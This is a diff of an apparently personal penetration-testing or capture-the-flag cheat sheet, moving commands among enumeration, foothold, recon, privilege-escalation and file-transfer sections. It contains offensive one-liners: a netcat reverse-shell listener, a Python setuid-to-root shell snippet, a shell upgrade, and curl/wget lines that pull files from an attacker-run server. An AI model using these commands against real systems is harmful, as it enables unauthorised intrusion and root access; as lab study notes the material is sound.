@@ -1,28 +1,28 @@
-basic gobuster directory search: gobuster dir --url http://{TARGET_IP}/ --wordlist
-/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
-
-to get functional shell use: python3 -c 'import pty;pty.spawn("/bin/bash")'
-
-for SMB Client: smbclient -N -L \\\\{TARGET_IP}\\
--N : No password
--L : This option allows you to look at what services are available on a server
 
 
 # ENUMERATION
 
-## Basic NMAP Scan
+## Basic NMAP Scan (Run on KALI)
 nmap -sC -sV
+
+## Basic GoBuster Directory Scan (Run on KALI)
+gobuster dir --url http://[TARGET_IP]/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
 
 # FOOTHOLD
 
-## Reverse Shell (Run on KALI)
-nc -lvnp 1234
+## FTP Anonymous Access (Run on KALI) (Linux or Windows)
+ftp [IP] -> anonymous:anonymous
 
-## HTTP Server (Run on KALI)
-sudo python3 -m http.server 80
+## SMB Client (Run on KALI) (Linux or Windows)
+smbclient -N -L \\\\[TARGET_IP]\\
+-N : No password
+-L : This option allows you to look at what services are available on a server
 
-# LATERAL MOVEMENT
+# ON-SITE RECON
 
+## WINPEAS
+
+## LINPEAS
 
 # PRIVILEGE ELEVATION
 
@@ -31,6 +31,19 @@ sudo python3 -m http.server 80
 import os
 os.setuid(0)
 os.system("/bin/bash")
+
+## Reverse Shell (Run on KALI)
+nc -lvnp 1234
+
+## HTTP Server (Run on KALI)
+sudo python3 -m http.server 80
+
+## File Pull from HTTP Server (Run on TARGET)
+curl http://[KALI IP]/[filename] (Linux)
+wget http://[KALI IP]/[filename] (Windows)
+
+## Make Script File Executable (Run on TARGET) (Linux)
+chmod +x [filename]
 
 # Exploitation
 
